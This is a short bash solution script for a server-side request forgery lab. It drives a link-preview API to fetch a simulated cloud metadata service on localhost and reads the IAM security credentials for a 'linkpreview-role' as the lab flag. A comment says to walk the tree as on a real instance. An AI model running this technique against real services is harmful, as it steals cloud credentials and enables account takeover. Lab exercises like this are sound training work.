#!/usr/bin/env bash
# Lab 25 — the fetch happens from inside, so ask it for something inside.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9250}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab25
META="http://127.0.0.1:9251"

open_lab "$SESSION" "$URL/api/preview?url=http://127.0.0.1:9251/" --allow 127.0.0.1

# Walk the tree the way you would on a real instance.
send "$SESSION" "$REQ0" --set "query.url=$META/latest/meta-data/iam/security-credentials/" | body >&2; echo >&2
send "$SESSION" "$REQ0" --set "query.url=$META/latest/meta-data/iam/security-credentials/linkpreview-role" | flag
